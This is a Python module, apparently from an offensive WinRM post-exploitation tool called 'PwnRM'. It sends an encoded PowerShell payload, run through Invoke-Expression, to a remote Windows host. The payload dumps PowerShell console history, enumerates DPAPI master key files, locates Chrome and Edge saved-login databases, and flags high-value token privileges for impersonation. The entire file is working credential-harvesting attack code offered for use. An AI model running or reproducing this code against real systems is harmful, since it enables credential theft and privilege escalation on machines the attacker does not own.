"""
modules.creds — Deep Credential Harvesting & Token Management
LSASS memory snapshot triage, DPAPI masterkey discovery, browser artifacts, and token impersonation.
"""

from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class CredsModule(BaseModule):
    name = "creds"
    description = "Deep Credential Harvesting (DPAPI, LSASS Snapshot, Browser & Vault Artifacts)"
    author = "uziii2208"
    options = {
        "--vault": {"desc": "Dump Windows Vault / Web Credentials"},
        "--dpapi": {"desc": "Enumerate DPAPI master keys and system credentials"},
        "--history": {"desc": "Dump PowerShell console history and config files"},
    }

    def run(self, shell, args: List[str]) -> Any:
        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning for credential artifacts..."))

        ps = r"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Deep Credential & Token Artifact Hunter" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

# 1. PowerShell History & Console Logs
Write-Host "[1. PowerShell History & Console Logs]" -ForegroundColor Yellow
$histPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
if (Test-Path $histPath) {
    Write-Host "  [+] FOUND: $histPath" -ForegroundColor Green
    $lines = Get-Content $histPath | Select-Object -Last 15
    Write-Host "      Recent commands:" -ForegroundColor Gray
    foreach ($l in $lines) { Write-Host "        $l" -ForegroundColor DarkGray }
}

# 2. DPAPI Master Keys & Credentials
Write-Host "`n[2. DPAPI & System Credentials]" -ForegroundColor Yellow
$dpapiUser = "$env:APPDATA\\Microsoft\\Protect"
if (Test-Path $dpapiUser) {
    $keys = Get-ChildItem -Path $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer }
    Write-Host "  [+] User DPAPI MasterKey files found ($($keys.Count) files):" -ForegroundColor Green
    foreach ($k in $keys | Select-Object -First 5) {
        Write-Host "      - $($k.FullName)" -ForegroundColor Gray
    }
}

# 3. Browser Credential Databases (Chrome / Edge / Brave)
Write-Host "`n[3. Browser Login Data & Local State]" -ForegroundColor Yellow
$browsers = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Local State"
)
foreach ($b in $browsers) {
    if (Test-Path $b) {
        Write-Host "  [+] Browser Artifact: $b" -ForegroundColor Green
    }
}

# 4. Token & Privileges
Write-Host "`n[4. Current Process Privileges & Token Status]" -ForegroundColor Yellow
whoami /priv | Where-Object { $_ -match "SeDebugPrivilege|SeImpersonatePrivilege|SeTcbPrivilege|SeAssignPrimaryTokenPrivilege|SeBackupPrivilege|SeRestorePrivilege" } | ForEach-Object {
    Write-Host "  [!] HIGH-VALUE PRIVILEGE: $_" -ForegroundColor Red
}

Write-Host "`n  [*] Credential scan complete." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        shell.run_with_interrupt(cmd, shell.write_line)
        return {"status": "completed"}
